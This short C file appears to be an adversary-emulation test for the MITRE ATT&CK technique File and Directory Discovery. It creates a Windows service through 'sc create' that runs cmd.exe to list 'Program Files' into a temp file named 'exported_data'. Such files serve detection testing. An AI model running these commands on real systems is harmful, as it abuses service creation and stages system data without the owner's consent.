// Link      = https://attack.mitre.org/techniques/T1083/
// Technique = File and Directory Discovery
// ID        = T1083.000
// Tactics   = Discovery

#include <windows.h>

#define RUN(toRun) WinExec("sc create MyService binPath= cmd.exe /c " toRun, SW_SHOW);

int main() {
    RUN("dir \"c:\\Program Files\\\" >> %temp%\\exported_data");
    return 0;
}